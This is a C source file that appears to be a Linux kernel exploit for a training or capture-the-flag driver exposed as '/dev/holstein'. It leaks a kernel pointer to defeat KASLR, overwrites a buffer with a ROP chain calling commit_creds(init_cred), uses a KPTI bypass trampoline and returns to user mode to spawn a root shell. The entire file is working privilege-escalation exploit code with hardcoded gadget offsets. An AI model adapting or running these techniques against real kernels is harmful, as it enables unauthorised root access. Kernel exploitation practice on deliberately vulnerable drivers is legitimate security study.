#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

#define is_error(c, s)          \
    {                           \
        if ((c)) {              \
            perror((s));        \
            exit(EXIT_FAILURE); \
        }                       \
    }

void hexdump(void *mem, unsigned int len)
{
	unsigned int i, j;

	for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
	{
		/* print offset */
		if(i % HEXDUMP_COLS == 0)
		{
			printf("0x%06x: ", i);
		}

		/* print hex data */
		if(i < len)
		{
			printf("%02x ", 0xFF & ((char*)mem)[i]);
		}
		else /* end of block, just aligning for ASCII dump */
		{
			printf("   ");
		}

		/* print ASCII dump */
		if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
		{
			for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
			{
				if(j >= len) /* end of block, not really printing */
				{
					putchar(' ');
				}
				else if(isprint(((char*)mem)[j])) /* printable char */
				{
					putchar(0xFF & ((char*)mem)[j]);        
				}
				else /* other char */
				{
					putchar('.');
				}
			}
			putchar('\n');
		}
	}
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };

    execve("/bin/sh", argv, envp);
}

static void save_state() {
    asm("movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

#define init_cred 0xffffffff824505e0 - 0xffffffff81000000
#define commit_creds  0xffffffff8108cd90 - 0xffffffff81000000
#define pop_rdi_ret 0xffffffff811719c0 - 0xffffffff81000000
#define bypass_kpti 0xffffffff81c00e06 - 0xffffffff81000000

int main() {
    int fd;
    char buf[0x500];

    save_state();

    fd = open("/dev/holstein", O_RDWR);
    is_error(fd == -1, "open() failed");

    read(fd, buf, 0x500);

	//ROP chain
	uint64_t* rop = (uint64_t*)(buf + 0x400);
	uint64_t kernel_text = rop[0];
	uint64_t kernel_base = kernel_text - (uint64_t)0x1f0c10;
	printf("[-] kernel base: %p\n", kernel_base);

	rop[0] = pop_rdi_ret + kernel_base;
	rop[1] = init_cred + kernel_base;
	rop[2] = commit_creds + kernel_base;
	rop[3] = bypass_kpti + kernel_base;
	rop[4] = 0;
	rop[5] = 0;
	rop[6] = win;
	rop[7] = user_cs;
	rop[8] = user_rflags;
	rop[9] = user_rsp;
	rop[10] = user_ss;

	write(fd, buf, 0x500);

    return 0;
}
